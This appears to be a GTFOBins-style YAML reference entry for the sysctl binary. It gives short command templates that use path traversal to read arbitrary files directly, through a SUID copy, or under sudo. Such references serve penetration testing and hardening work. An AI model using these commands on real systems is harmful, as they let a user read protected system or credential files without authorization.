---
description: The `-p` argument can also be used in place of `-n`. In both cases though the output might get corrupted, so this might not be suitable to read binary files.
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        /usr/sbin/sysctl -n "/../../$LFILE"
  suid:
    - code: |
        LFILE=file_to_read
        ./sysctl -n "/../../$LFILE"
  sudo:
    - code: |
        LFILE=file_to_read
        sudo sysctl -n "/../../$LFILE"
---
